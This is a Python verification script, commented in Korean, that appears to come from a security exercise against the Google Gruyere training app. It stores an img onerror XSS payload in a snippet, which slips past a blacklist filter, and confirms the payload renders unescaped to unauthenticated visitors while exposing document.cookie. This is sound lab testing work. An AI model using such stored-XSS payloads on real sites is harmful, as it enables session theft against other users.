#!/usr/bin/env python3
"""Round 4 — 저장형 XSS (스니펫, SanitizeHtml 블랙리스트 누락) 검증.

서버측 sanitize.SanitizeHtml() 은 화이트리스트 태그 + 블랙리스트 속성 방식인데,
블랙리스트(disallowed_attributes)에 onerror 가 없다. img 는 허용 태그다.
따라서 <img src=x onerror=...> 는 필터를 통과해 그대로 저장/렌더될 것으로 예상된다.

검증 순서:
  1) brie 로그인 후 스니펫 저장 (내 테스트 계정 → 범위 내 상태변경)
  2) 비인증(쿠키 없음) 상태로 /snippets.gtl?uid=brie 와 / 를 받아 원문 확인
  3) 브라우저(CDP)로 비인증 방문자 시뮬레이션 → 실제 실행 증거
"""
from __future__ import annotations

import re
import subprocess
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRATCH = ROOT / "scratch"
EVIDENCE = ROOT / "evidence"
EVIDENCE.mkdir(exist_ok=True)
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = SCRATCH / "gruyere.cookies"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"

# 실행 증거를 남기기 위한 페이로드: title 변경 + DOM 마커 + 쿠키 노출
PAYLOAD = (
    '<img src=x-nonexistent.png '
    'onerror="document.title=\'XSS-EXECUTED\';'
    "var d=document.createElement('div');d.id='xss-proof';"
    "d.textContent='COOKIE='+document.cookie;"
    'document.body.appendChild(d)">'
)


def fetch(path: str, auth: bool = True, out: Path | None = None) -> str:
    cmd = ["curl", "-s", "--path-as-is", "--max-time", "30",
           "-x", "http://127.0.0.1:8080", "--cacert", CA]
    if auth:
        cmd += ["-b", str(JAR), "-c", str(JAR)]
    cmd.append(BASE + path)
    txt = subprocess.run(cmd, capture_output=True, text=True).stdout
    if out:
        out.write_text(txt, encoding="utf-8", errors="replace")
    return txt


def main() -> None:
    rep: list[str] = []
    rep.append(f"GID={GID}\nBASE={BASE}")
    rep.append(f"\n### 페이로드\n{PAYLOAD}\n")

    # 0) 로그인
    fetch("/login?uid=brie&pw=briebrie")
    rep.append("### 0) brie 로그인 완료")

    # 1) 스니펫 저장 (GET 파라미터)
    q = "/newsnippet2?snippet=" + urllib.parse.quote(PAYLOAD, safe="")
    body = fetch(q)
    rep.append(f"\n### 1) 저장 요청\nGET {q[:120]}...\n→ 응답 {len(body)} bytes (302 후 리다이렉트 본문)")

    # 2) 비인증 렌더 확인
    rep.append("\n### 2) 비인증 렌더 확인 (쿠키 없이)")
    unauth_snips = fetch("/snippets.gtl?uid=brie", auth=False,
                         out=EVIDENCE / "round4_unauth_snippets_brie.html")
    unauth_home = fetch("/", auth=False, out=EVIDENCE / "round4_unauth_home.html")
    feed = fetch("/feed.gtl?uid=brie", auth=False,
                 out=EVIDENCE / "round4_feed_brie.txt")

    def snippet_div(html: str) -> str:
        m = re.search(r"<div id='0'>(.*?)</div>", html, re.S)
        return m.group(1).strip() if m else "(div id=0 없음)"

    raw_in_page = "onerror=" in unauth_snips
    rep.append(f"  서버 원문에 onerror= 포함 여부(이스케이프 안 됨): {raw_in_page}")
    rep.append(f"  <div id='0'> 안의 저장된 스니펫:\n    {snippet_div(unauth_snips)}")
    home_span = re.search(r"<span id='brie'>(.*?)</span>", unauth_home, re.S)
    rep.append(f"  홈(/)의 <span id='brie'>:\n    {home_span.group(1).strip() if home_span else '(없음)'}")
    rep.append(f"  /feed.gtl?uid=brie 원문(앞 300): {feed.strip()[:300]!r}")
    rep.append(f"  홈/스니펫 페이지에 CSP 헤더 있는지 확인은 별도 기록(이전 라운드: 없음)")

    out = "\n".join(rep)
    (EVIDENCE / "round4_stored_xss_snippet.txt").write_text(out, encoding="utf-8")
    print(out)


if __name__ == "__main__":
    main()
